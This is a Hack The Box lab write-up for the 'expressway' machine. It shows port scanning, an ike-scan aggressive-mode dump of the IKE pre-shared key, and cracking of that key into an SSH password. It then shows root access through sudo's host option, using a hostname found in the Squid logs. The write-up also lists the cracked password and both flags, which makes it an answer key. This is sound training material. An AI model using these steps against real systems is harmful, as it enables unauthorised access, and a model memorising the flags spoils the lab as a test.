# Flags
- User
	- 32d58e10eeddb112e76c2df342512ccf
- Root
	- 847d7dddc2963cb95322ba1e65cf5dee


# Notes
- First, let's run a scan
```
rustscan --ulimit 5000 --addresses "10.129.10.139" --top -- -sC -sV
```
- From the results, we only see an SSH server
``` 
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Visiting the IP in a web browser, no website is present, so we are good on that front
- Let's do some UDP ports to see if there is anything there
```
[Feb 02, 2026 - 19:51:46 (PST)] exegol-htb-labs /workspace # nmap 10.129.10.139 -sU --top-ports 100        
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-02 19:52 PST  
Nmap scan report for 10.129.10.139  
Host is up (0.11s latency).  
Not shown: 81 closed udp ports (port-unreach)  
PORT      STATE         SERVICE  
68/udp    open|filtered dhcpc  
69/udp    open|filtered tftp  
111/udp   open|filtered rpcbind  
139/udp   open|filtered netbios-ssn  
427/udp   open|filtered svrloc  
500/udp   open          isakmp  
520/udp   open|filtered route  
626/udp   open|filtered serialnumberd  
996/udp   open|filtered vsinet  
1023/udp  open|filtered unknown  
1719/udp  open|filtered h323gatestat  
1813/udp  open|filtered radacct  
2000/udp  open|filtered cisco-sccp  
2048/udp  open|filtered dls-monitor  
2223/udp  open|filtered rockwell-csp2  
4444/udp  open|filtered krb524  
4500/udp  open|filtered nat-t-ike  
49156/udp open|filtered unknown  
49200/udp open|filtered unknown
```
- From the results, we are able to see the existence of nat-t-ike, which could be our way in
- So with that, we can pull off an IKE scan
```
[Feb 02, 2026 - 19:53:31 (PST)] exegol-htb-labs /workspace # ike-scan -M 10.129.10.139  
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)  
10.129.10.139   Main Mode Handshake returned  
       HDR=(CKY-R=4b97f1fb31874518)  
       SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)  
       VID=09002689dfd6b712 (XAUTH)  
       VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```
- Therefore, we can confirmed the existence of the IPsec endpoint, so let's look into that more
```
[Feb 02, 2026 - 19:56:58 (PST)] exegol-htb-labs /workspace # ike-scan -P -M -A -n fakeID 10.129.10.139  
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)  
10.129.10.139   Aggressive Mode Handshake returned  
       HDR=(CKY-R=ed13b51c93a24e33)  
       SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)  
       KeyExchange(128 bytes)  
       Nonce(32 bytes)  
       ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)  
       VID=09002689dfd6b712 (XAUTH)  
       VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)  
       Hash(20 bytes)  
  
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):  
b14f66294194a40875ab25cab772e3b57d1ac389e8f978e67bb8ba4d1d93502b33695dcf1f4bc3ad0a2619fecf885037031c3506468f0d7f7819c96a215c515d284ff6dfad6fb74fae1ac9d5a6223cee1200bad3b2d29e99be9777fb12caf9e2955f4c94fb8a43f01567c01e6d46558628944b07151b  
757dac59e9e2ee9b8a5c:8396761d44adbd7af6e801bc649d3270619ff104b0b6cd172d891602f0845531e9746a888bc7791f6eabe5bb3bcb9bffea4fcec5c6c3df4861df59d8539ce4deb89d87b69b62a19cd864b0b3d20fbbe3c9c1a79d25df90e94aaa9ee2301d8f75bf0811ee0b73bce0bf3b86a  
bdc37299a544d2adf0af115b216c0fcf9e5591c86:ed13b51c93a24e33:3ced0dca782bb5f4:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001  
000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:c16c774ae33b53ae68ee8651664cd7  
e7ecbc06f2:2b5ed24c409b70edae4b8c5db9a9bf20a261aacfb75d8280d6adcf69e871a321:712cf86ba207ef340bdaae782fc8bf21e8eef594  
Ending ike-scan 1.9.5: 1 hosts scanned in 0.088 seconds (11.31 hosts/sec).  1 returned handshake; 0 returned notify
```
- This worked, we got dumped IKEv1 PSK parameters.
- We can copy these into a file
```
[Feb 02, 2026 - 19:58:42 (PST)] exegol-htb-labs /workspace # ls  
ike.psk
```
- And then crack that!
```
[Feb 02, 2026 - 19:58:42 (PST)] exegol-htb-labs /workspace # psk-crack -d `fzf-wordlists` ike.psk                                 
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)  
Running in dictionary cracking mode  
key "freakingrockstarontheroad" matches SHA1 hash 712cf86ba207ef340bdaae782fc8bf21e8eef594  
Ending psk-crack: 8045039 iterations in 3.543 seconds (2270663.15 iterations/sec)
```
- Boom, we have the key now.
- We can verify this is the correct key by running this:
```
[Feb 02, 2026 - 19:32:58 (PST)] exegol-htb-labs /workspace # ike-scan --psk='`freakingrockstarontheroad`' 10.129.10.139     
WARNING: The --pskcrack (-P) option is only relevant for aggressive mode.  
  
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)  
10.129.10.139   Main Mode Handshake returned HDR=(CKY-R=8acee78b1984ba6d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer  
Detection v1.0)  
  
Ending ike-scan 1.9.5: 1 hosts scanned in 0.089 seconds (11.20 hosts/sec).  1 returned handshake; 0 returned notify
```
- A Main Mode Handshake is returned, which means this is valid
- We can how SSH into the account using that newly found password
```
[Feb 02, 2026 - 20:02:14 (PST)] exegol-htb-labs /workspace # ssh ike@10.129.10.139                                                                            
The authenticity of host '10.129.10.139 (10.129.10.139)' can't be established.  
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.10.139' (ED25519) to the list of known hosts.  
ike@10.129.10.139's password:    
Permission denied, please try again.  
ike@10.129.10.139's password:    
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh  
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Tue Feb 3 04:03:20 2026 from 10.10.15.4  
ike@expressway:~$
```
- We can then print out the user flag
```
ike@expressway:~$ cat user.txt    
32d58e10eeddb112e76c2df342512ccf
```
- Now, we can attempt to priv-esc
- I tried using sudo -l, but that didn't work.
- However, further looking into our directory, we do have interesting .ssh directory to look at
```
ike@expressway:~$ ls -al  
total 32  
drwx------ 4 ike  ike  4096 Sep 16 10:23 .  
drwxr-xr-x 3 root root 4096 Aug 14 22:48 ..  
lrwxrwxrwx 1 root root    9 Aug 29 14:57 .bash_history -> /dev/null  
-rw-r--r-- 1 ike  ike   220 May 18  2025 .bash_logout  
-rw-r--r-- 1 ike  ike  3526 Aug 28 12:49 .bashrc  
drwxr-xr-x 3 ike  ike  4096 Aug 28 12:29 .local  
-rw-r--r-- 1 ike  ike   807 May 18  2025 .profile  
drwx------ 2 ike  ike  4096 Sep 16 10:21 .ssh  
-rw-r----- 1 root ike    33 Feb  3 03:40 user.txt
```
- This leads us to squid logs
```
ike@expressway:/var/log/squid$ ls  
access.log.1  access.log.2.gz  cache.log.1  cache.log.2.gz  
ike@expressway:/var/log/squid$ cat access.log.1    
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html  
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html  
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html  
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html  
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html  
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html  
ike@expressway:/var/log/squid$
```
- However, something interesting shows up when we search for HTB
```
ike@expressway:/var/log/squid$ cat access.log.1 | grep htb  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```
- Sure enough, running that gets us root!
```
ike@expressway:/var/log/squid$ sudo -h offramp.expressway.htb bash  
root@expressway:/var/log/squid# whoami  
root
```
- We can now get the root flag with no issues
```
root@expressway:~# cat root.txt    
847d7dddc2963cb95322ba1e65cf5dee
```
